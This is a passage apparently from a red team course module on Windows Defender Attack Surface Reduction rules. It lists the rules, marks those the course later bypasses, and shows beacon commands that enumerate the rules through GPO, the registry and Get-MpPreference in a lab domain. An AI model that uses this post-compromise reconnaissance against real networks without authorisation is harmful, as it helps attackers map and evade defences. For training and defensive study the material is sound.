[Attack Surface Reduction](https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-atp/attack-surface-reduction) (ASR) is a set of hardening configurations that aims to mitigate attack techniques commonly used by attackers.  ASR rules are implemented in LUA and are enforced by Windows Defender.  They are as follows (highlighted in bold are the ones we'll focus on in the module):

-   Block abuse of exploited vulnerable signed drivers
-   Block Adobe Reader from creating child processes
-   **Block all Office applications from creating child processes**
-   **Block credential stealing from the Windows local security authority subsystem (lsass.exe)**
-   Block executable content from email client and webmail
-   Block executable files from running unless they meet a prevalence, age, or trusted list criterion
-   Block execution of potentially obfuscated scripts
-   Block JavaScript or VBScript from launching downloaded executable content
-   Block Office applications from creating executable content
-   **Block Office applications from injecting code into other processes**
-   Block Office communication application from creating child processes
-   Block persistence through WMI event subscription
-   **Block process creations originating from PSExec and WMI commands**
-   Block untrusted and unsigned processes that run from USB
-   **Block Win32 API calls from Office macros**
-   Use advanced protection against ransomware

Many of these rules do work in combination - you could find a bypass to a single rule in isolation, but it may still be blocked by another rule.  The bypasses demonstrated in this module assume that all the highlighted rules are enabled at the same time.

## Enumeration

ASR rules can be enumerated remotely via GPO, from the local registry of a machine to which they're applied, or with PowerShell's Get-MpPreference cmdlet.

### GPO

The first task is to identify the GPO containing the ASR configuration - one possible approach is to search GPOs by name.

```shell
beacon> powershell-import /root/tools/PowerView.ps1
beacon> powerpick Get-DomainGPO -Name ASR -Properties GpcFileSysPath

gpcfilesyspath                                                                              
--------------                                                                              
\\redteamops2.local\SysVol\redteamops2.local\Policies\{0047C7A8-63E1-4F60-A981-D5DD7F3F8663}

beacon> ls \\redteamops2.local\SysVol\redteamops2.local\Policies\{0047C7A8-63E1-4F60-A981-D5DD7F3F8663}\Machine

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 554b     fil     11/12/2021 18:02:45   comment.cmtx
 1kb      fil     11/12/2021 18:02:45   Registry.pol
```

  

Download **Registry.pol** from the GpcFileSysPath and read it with **Parse-PolFile**.

```shell
beacon> download \\redteamops2.local\SysVol\redteamops2.local\Policies\{0047C7A8-63E1-4F60-A981-D5DD7F3F8663}\Machine\Registry.pol
[*] Tasked beacon to download \\redteamops2.local\SysVol\redteamops2.local\Policies\{0047C7A8-63E1-4F60-A981-D5DD7F3F8663}\Machine\Registry.pol
[+] host called home, sent: 121 bytes
[*] started download of \\redteamops2.local\SysVol\redteamops2.local\Policies\{0047C7A8-63E1-4F60-A981-D5DD7F3F8663}\Machine\Registry.pol (1588 bytes)
[*] download of Registry.pol is complete

PS C:\Users\Administrator\Desktop> Parse-PolFile .\Registry.pol

KeyName     : Software\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR
ValueName   : ExploitGuard_ASR_Rules
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 1

KeyName     : Software\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR\Rules
ValueName   : d4f940ab-401b-4efc-aadc-ad5f3c50688a
ValueType   : REG_SZ
ValueLength : 4
ValueData   : 1
```

  

The first entry is called **ExploitGuard_ASR_Rules** and the ValueData is set to **1**.  This simply indicates that ASR rules are enabled.  Following are each ASR rule donated by its GUID.  d4f940ab-401b-4efc-aadc-ad5f3c50688a is **Block all Office applications from creating child processes.**

These values can be:

-   0 - Disable
-   1 - Block
-   2 - Audit
-   6 - Warn

You can find which OUs (and subsequently which machines) this GPO is applied to with `Get-DomainOU` and the `-GPLink` parameter.  This will only return OUs that the specified GPO GUID in their gplink property.

```shell
beacon> powerpick Get-DomainOU -GPLink 0047C7A8-63E1-4F60-A981-D5DD7F3F8663 -Properties DistinguishedName

distinguishedname                           
-----------------                           
OU=2,OU=Workstations,DC=redteamops2,DC=local

beacon> powerpick Get-DomainComputer -SearchBase "LDAP://OU=2,OU=Workstations,DC=redteamops2,DC=local" -Properties SamAccountName

samaccountname
--------------
WKSTN-2$  
```

  

### Registry

To read from a local registry, simply query **HKLM**:

```shell
beacon> reg query x64 HKLM\Software\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR

ExploitGuard_ASR_Rules   1

beacon> reg query x64 HKLM\Software\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR\Rules

d4f940ab-401b-4efc-aadc-ad5f3c50688a 1
9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2 1
75668c1f-73b5-4cf0-bb93-3ecf5cb7cc84 1
d1e49aac-8f56-4280-b9ba-993a6d77406c 1
92e97fa1-2edf-4476-bdd6-9dd0b4dddc7b 1
```

  

### PowerShell

```shell
beacon> powerpick Get-MpPreference | select -expand AttackSurfaceReductionRules_Ids

75668c1f-73b5-4cf0-bb93-3ecf5cb7cc84
92e97fa1-2edf-4476-bdd6-9dd0b4dddc7b
9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2
d1e49aac-8f56-4280-b9ba-993a6d77406c
d4f940ab-401b-4efc-aadc-ad5f3c50688a

beacon> powerpick Get-MpPreference | select -expand AttackSurfaceReductionRules_Actions

1
1
1
1
1
```